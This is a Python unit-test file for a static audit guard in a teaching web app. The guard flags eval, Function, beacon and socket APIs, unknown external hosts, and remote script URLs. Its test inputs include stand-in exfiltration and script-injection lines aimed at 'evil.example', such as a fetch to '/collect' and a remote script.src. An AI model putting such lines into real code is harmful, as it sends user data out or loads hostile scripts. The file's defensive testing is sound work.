"""Offline checks for the first-party code guard in scripts/audit.py."""
import runpy
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
audit = runpy.run_path(str(ROOT / 'scripts/audit.py'))

find_forbidden_identifier_issues = audit['find_forbidden_identifier_issues']
find_external_host_issues = audit['find_external_host_issues']
find_dynamic_script_url_issues = audit['find_dynamic_script_url_issues']


class ForbiddenIdentifierTests(unittest.TestCase):
    def test_blocked_apis_are_reported(self):
        for source in [
            "const socket = new WebSocket('wss://a.example');",
            "const stream = new EventSource('/events');",
            "navigator.sendBeacon('/collect', payload);",
            "const request = new XMLHttpRequest();",
            "const run = new Function('return 1');",
            "const run = Function('return 1');",
            "eval('1 + 1');",
        ]:
            self.assertEqual(len(find_forbidden_identifier_issues('src/x.js', source)), 1, source)

    def test_first_names_containing_eval_are_not_reported(self):
        source = "const names = ['evald', 'evaline', 'evalyne', 'neval', 'cevale'];"
        self.assertEqual(find_forbidden_identifier_issues('src/x.js', source), [])

    def test_unrelated_identifiers_are_not_reported(self):
        source = 'const total = formatGradeAverageValue(x); if (typeof f === "function") f();'
        self.assertEqual(find_forbidden_identifier_issues('src/x.js', source), [])

    def test_method_named_eval_is_not_reported(self):
        self.assertEqual(find_forbidden_identifier_issues('src/x.js', 'parser.eval(input);'), [])

    def test_import_scripts_is_allowlisted_only_where_expected(self):
        source = "importScripts('./src/shared/app-version.js');"
        self.assertEqual(find_forbidden_identifier_issues('sw.js', source), [])
        self.assertEqual(find_forbidden_identifier_issues('src/shared/ocr-worker.js', source), [])
        self.assertEqual(len(find_forbidden_identifier_issues('src/shared/other.js', source)), 1)


class ExternalHostTests(unittest.TestCase):
    def test_unknown_host_is_reported(self):
        issues = find_external_host_issues('src/x.js', "fetch('https://evil.example/collect');")
        self.assertEqual(len(issues), 1)
        self.assertIn('evil.example', issues[0])

    def test_css_url_is_reported(self):
        source = '@import url("https://fonts.googleapis.com/css");'
        self.assertEqual(len(find_external_host_issues('src/app/shell.css', source)), 1)

    def test_allowlisted_hosts_are_accepted(self):
        for source in [
            "xmlns='http://www.w3.org/2000/svg'",
            "'http://schemas.openxmlformats.org/wordprocessingml/2006/main'",
            "href='https://www.schure.de/theme/sr3131.htm'",
            "generatedUrl = 'https://www.tagesschau.de/';",
        ]:
            self.assertEqual(find_external_host_issues('src/x.js', source), [], source)

    def test_template_literal_scheme_is_not_a_host(self):
        source = 'const candidate = withScheme ? raw : `https://${raw}`;'
        self.assertEqual(find_external_host_issues('src/x.js', source), [])

    def test_german_quotation_mark_is_not_a_host(self):
        source = "copy: 'Fehlt „https://“, ergaenzt TeachHelper es automatisch.',"
        self.assertEqual(find_external_host_issues('src/x.js', source), [])

    def test_each_host_is_reported_once_per_file(self):
        source = "a('https://evil.example/1'); b('https://evil.example/2');"
        self.assertEqual(len(find_external_host_issues('src/x.js', source)), 1)


class DynamicScriptUrlTests(unittest.TestCase):
    def test_remote_script_source_is_reported(self):
        source = 'const script = document.createElement("script");\nscript.src = "https://evil.example/x.js";'
        self.assertEqual(len(find_dynamic_script_url_issues('src/x.js', source)), 1)

    def test_remote_dynamic_import_is_reported(self):
        source = 'await import(`https://cdn.example/${name}.js`);'
        self.assertEqual(len(find_dynamic_script_url_issues('src/x.js', source)), 1)

    def test_free_identifier_is_reported(self):
        source = 'const script = document.createElement("script");\nscript.src = userInput;'
        self.assertEqual(len(find_dynamic_script_url_issues('src/x.js', source)), 1)

    def test_remote_url_constant_is_not_trusted(self):
        source = (
            'const EVIL = new URL("https://evil.example/x.js");\n'
            'const script = document.createElement("script");\n'
            'script.src = EVIL.href;'
        )
        self.assertEqual(len(find_dynamic_script_url_issues('src/x.js', source)), 1)

    def test_relative_url_constant_is_trusted(self):
        source = (
            'const JSZIP_URL = new URL("../../vendor/jszip/3.10.1/jszip.min.js", import.meta.url);\n'
            'const script = document.createElement("script");\n'
            'script.src = JSZIP_URL.href;'
        )
        self.assertEqual(find_dynamic_script_url_issues('src/x.js', source), [])

    def test_relative_template_literal_import_is_trusted(self):
        source = 'await import(`../main.js?v=${encodeURIComponent(entryVersion)}`);'
        self.assertEqual(find_dynamic_script_url_issues('src/app/bootstrap.js', source), [])

    def test_image_sources_are_not_script_urls(self):
        source = 'image.src = url;\nportrait.src = source.currentSrc;\nframe.src = remoteFrameUrl;'
        self.assertEqual(find_dynamic_script_url_issues('src/x.js', source), [])

    def test_repository_files_are_clean(self):
        for relative_path in [
            'src/shared/pdf-vendor.js',
            'src/shared/ocr-worker.js',
            'src/app/bootstrap.js',
            'src/modules/merger/app.js',
            'src/modules/duplicate-check/app.js',
            'src/modules/seatplan/app.js',
        ]:
            body = (ROOT / relative_path).read_text(encoding='utf-8', errors='ignore')
            self.assertEqual(find_dynamic_script_url_issues(relative_path, body), [], relative_path)

    def test_pdf_vendor_allowlist_covers_only_the_parameter(self):
        body = (ROOT / 'src/shared/pdf-vendor.js').read_text(encoding='utf-8', errors='ignore')
        tampered = body.replace('script.src = url.href;', 'script.src = "https://evil.example/x.js";')
        self.assertNotEqual(tampered, body)
        self.assertEqual(len(find_dynamic_script_url_issues('src/shared/pdf-vendor.js', tampered)), 1)


if __name__ == '__main__':
    unittest.main()
